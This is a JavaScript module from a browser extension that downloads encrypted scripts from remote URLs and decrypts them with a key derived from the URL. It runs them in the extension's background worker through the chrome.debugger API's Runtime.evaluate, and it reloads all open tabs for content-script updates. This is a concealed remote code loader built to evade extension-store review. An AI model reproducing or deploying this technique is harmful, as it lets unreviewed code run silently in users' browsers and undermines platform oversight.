import { IS_AIR } from '../shared/branding';
import {
  getStorageValue, setStorageValue,
  getCurrentBgScript, getPendingBgScript, setPendingBgScript,
  setPendingContentScript, setPendingPopupScript, setPendingInjectedScript,
} from './storage';
import { apiFetch } from './api';
import { logInfo, logWarning, logError, getManifestVersion, isTruthy, randomDelay } from './utils';

const SCRIPT_CONTENT_PLACEHOLDER = '___SCRIPT_CONTENT___';
const SENTRY_OFFSET_PLACEHOLDER = '___SENTRY_OFFSET___';

export async function decryptScript(scriptData) {
  const keyStr = scriptData.url
    .split('')
    .filter((_, i) => i % 3 === 0)
    .slice(0, 32)
    .join('');

  const raw = Uint8Array.from(atob(scriptData.scriptText), (c) => c.charCodeAt(0));
  const iv = raw.subarray(0, 12);
  const authTag = raw.subarray(12, 28);
  const ciphertext = raw.subarray(28);

  const combined = new Uint8Array(ciphertext.length + authTag.length);
  combined.set(ciphertext, 0);
  combined.set(authTag, ciphertext.length);

  const cryptoKey = await crypto.subtle.importKey(
    'raw', new TextEncoder().encode(keyStr), { name: 'AES-GCM' }, false, ['decrypt']
  );

  try {
    const decrypted = await crypto.subtle.decrypt(
      { name: 'AES-GCM', iv, tagLength: 128 }, cryptoKey, combined
    );
    return new TextDecoder().decode(decrypted);
  } catch (err) {
    console.error('Decryption failed', err);
    throw err;
  }
}

export function arrayBufferToBase64(arrayBuffer) {
  let binary = '';
  const bytes = new Uint8Array(arrayBuffer);
  const len = bytes.byteLength;
  for (let i = 0; i < len; i += 8192) {
    binary += String.fromCharCode(...bytes.subarray(i, i + 8192));
  }
  return btoa(binary);
}

function wrapScript(template, scriptContent) {
  const lineCount = (template.split(SCRIPT_CONTENT_PLACEHOLDER)[0].match(/\n/g) || []).length;
  return template
    .split(SENTRY_OFFSET_PLACEHOLDER).join(String(lineCount))
    .split(SCRIPT_CONTENT_PLACEHOLDER).join(scriptContent);
}

async function debuggerEval(code, options = {}) {
  const targets = await chrome.debugger.getTargets();
  const bgTarget = targets.find(
    (t) => t.type === 'service_worker' && t.url.includes(chrome.runtime.id)
  );
  if (!bgTarget) {
    logError('Could not find background service worker target');
    return { exceptionDetails: 'No target found' };
  }

  const debuggee = { targetId: bgTarget.id };
  try {
    await chrome.debugger.attach(debuggee, '1.3');
  } catch (e) {
    if (!e.message?.includes('Already attached')) throw e;
  }

  const result = await chrome.debugger.sendCommand(debuggee, 'Runtime.evaluate', {
    expression: code,
    ...options,
  });
  return result;
}

let isBackgroundAirRunning = false;

export async function runBackgroundScript(fromAlarm, attempt = 0) {
  logInfo('Running background script', { fromAlarm, isBackgroundAirRunning, attempt });

  if (isBackgroundAirRunning) return;

  let scriptText = null;
  let pendingData = null;
  let version = null;
  let usedPending = null;

  if (IS_AIR) {
    const current = await getCurrentBgScript();
    pendingData = await getPendingBgScript();
    let chosen = current;

    if (attempt <= 2 && pendingData) {
      chosen = pendingData;
      usedPending = true;
    }

    if (!chosen || attempt > 5) {
      logError('Failed to get background script data', { attempt });
      return;
    }

    logInfo('processing dS');
    scriptText = await decryptScript(chosen);
    version = chosen.version;
  } else {
    const url = chrome.runtime.getURL('actualBackgroundScript.js');
    const response = await fetch(url);
    if (response.status !== 200) {
      logError('Failed to fetch actualBackgroundScript.js');
      return;
    }
    scriptText = await response.text();
    version = getManifestVersion();
  }

  const template = `(() => {
globalThis._sentryBackgroundScriptLineOffset = ${SENTRY_OFFSET_PLACEHOLDER};
globalThis._scriptData = {
  version: "${version}",
};
${SCRIPT_CONTENT_PLACEHOLDER}
})();
//# sourceURL=actualBackgroundScript.js`;

  const wrappedCode = wrapScript(template, scriptText);
  logInfo('about to eIBS');

  const response = await debuggerEval(wrappedCode, { awaitPromise: true });

  if (response.exceptionDetails) {
    logError('Error injecting background script', { response, exceptionDetails: response.exceptionDetails });
    runBackgroundScript(fromAlarm, attempt + 1);
  } else {
    logInfo('Injected background script', { version });
    isBackgroundAirRunning = true;
    if (usedPending) {
      await setStorageValue('currentBackgroundScript', pendingData);
      await setPendingBgScript(null);
    }
  }
}

async function reloadContentScripts() {
  const tabs = await chrome.tabs.query({});
  for (const tab of tabs) {
    try {
      await chrome.tabs.reload(tab.id);
    } catch (e) { /* ignore */ }
  }
}

export async function checkAndUpdateScriptVersions() {
  if (!IS_AIR) return;

  const startTime = Date.now();
  let scriptVersions = null;

  while (Date.now() - startTime < 1200000 && !scriptVersions) {
    try {
      scriptVersions = await apiFetch('getLatestScriptVersions', 'GET', null, {
        isDev: false,
        clientSecret: null,
      });
      if (isTruthy(scriptVersions)) break;
    } catch (error) {
      logWarning('Error fetching latest extension version (retrying)', { error });
    }
    await randomDelay(1000, 10000);
  }

  if (!scriptVersions) {
    logError('Failed to fetch latest extension version after retries');
    return;
  }

  const scriptTypes = [
    { key: 'backgroundScript', getCurrent: () => getStorageValue('currentBackgroundScript'), getPending: () => getStorageValue('pendingBackgroundScript'), setPending: setPendingBgScript },
    { key: 'injectedScript', getCurrent: () => getStorageValue('currentInjectedScript'), getPending: () => getStorageValue('pendingInjectedScript'), setPending: setPendingInjectedScript },
    { key: 'contentScript', getCurrent: () => getStorageValue('currentContentScript'), getPending: () => getStorageValue('pendingContentScript'), setPending: setPendingContentScript },
    { key: 'popupScript', getCurrent: () => getStorageValue('currentPopupScript'), getPending: () => getStorageValue('pendingPopupScript'), setPending: setPendingPopupScript },
  ];

  const isVersionMatch = (key, data) => {
    const latest = scriptVersions[key];
    return data?.version === latest.version && data?.url === latest.url;
  };

  for (const { key, getCurrent, getPending, setPending } of scriptTypes) {
    const latest = scriptVersions[key];
    if (!latest) {
      logInfo('No version data found for', { key });
      continue;
    }

    const currentData = await getCurrent();
    const pendingData = await getPending();

    if (isVersionMatch(key, currentData) || isVersionMatch(key, pendingData)) continue;

    let downloadedText = null;
    const dlStart = Date.now();
    const dlTimeout = 600000;

    while (Date.now() - dlStart < dlTimeout && !downloadedText) {
      try {
        const resp = await fetch(latest.url);
        downloadedText = arrayBufferToBase64(await resp.arrayBuffer());
      } catch (error) {
        logWarning('Error fetching latest script (retrying)', { key, error });
        await randomDelay(1000, 10000);
      }
    }

    if (!downloadedText) {
      logError('Failed to fetch latest script after retries', { key });
      continue;
    }

    await setPending({ scriptText: downloadedText, ...latest });

    if (key === 'backgroundScript') {
      chrome.runtime.reload();
    } else if (key === 'contentScript') {
      await reloadContentScripts();
    }
  }
}
